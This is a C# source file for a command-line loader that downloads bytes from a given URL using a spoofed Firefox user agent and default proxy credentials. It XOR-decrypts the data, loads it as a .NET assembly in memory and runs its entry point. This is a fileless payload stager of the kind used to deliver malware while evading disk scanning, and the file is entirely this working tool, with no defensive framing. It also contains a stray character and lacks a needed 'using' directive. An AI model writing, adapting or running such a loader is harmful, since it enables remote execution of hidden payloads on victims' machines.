using System;
using System.Collections.Generic;
using System.Net;
²

class Program
{
    static void Main(string[] args)
    {
        string key = null;
        string url = null;
        List<string> customArgs = new List<string>();

        for (int i = 0; i < args.Length; i++)
        {
            if (args[i].Equals("--key", StringComparison.OrdinalIgnoreCase))
            {
                if (i + 1 < args.Length)
                {
                    key = args[i + 1];
                    i++; // Skip the next argument, which is the XOR key value
                }
                else
                {
                    Console.WriteLine("Error: Missing XOR_KEY value after --key.");
                    return;
                }
            }
            else if (args[i].Equals("--url", StringComparison.OrdinalIgnoreCase))
            {
                if (i + 1 < args.Length)
                {
                    url = args[i + 1];
                    i++; // Skip the next argument, which is the URL value
                }
                else
                {
                    Console.WriteLine("Error: Missing URL value after --url.");
                    return;
                }
            }
            else if (args[i].Equals("--args", StringComparison.OrdinalIgnoreCase))
            {
                // Collect all subsequent arguments as custom arguments
                for (int j = i + 1; j < args.Length; j++)
                {
                    customArgs.Add(args[j]);
                }
                break; // No need to process further arguments
            }
        }

        try
        {
            // Create a new instance of WebClient
            WebClient webClient = new WebClient();

            // Set the user agent to mimic Firefox
            webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");

            // Use the default web proxy with default network credentials
            webClient.Proxy = WebRequest.DefaultWebProxy;
            webClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            // Download the executable as bytes from the specified URL
            byte[] downloadedBytes = webClient.DownloadData(url);

            // Perform XOR decryption if the key is provided
            if (!string.IsNullOrEmpty(key))
            {
                byte[] decryptedBytes = new byte[downloadedBytes.Length];
                for (int i = 0; i < downloadedBytes.Length; i++)
                {
                    decryptedBytes[i] = (byte)(downloadedBytes[i] ^ key[i % key.Length]);
                }
                downloadedBytes = decryptedBytes;
            }

            // Load the downloaded (and optionally decrypted) bytes as an assembly
            Assembly loadedAssembly = Assembly.Load(downloadedBytes);

            // Find the entry point (Main) method of the loaded assembly
            MethodInfo entryPoint = loadedAssembly.EntryPoint;

            if (entryPoint != null)
            {
                // Prepare the arguments for the Main method
                string[] mainArgs = customArgs.ToArray();

                // Invoke the Main method with the prepared arguments
                entryPoint.Invoke(null, new object[] { mainArgs });
            }
            else
            {
                Console.WriteLine("No entry point (Main method) found in the loaded assembly.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }
}
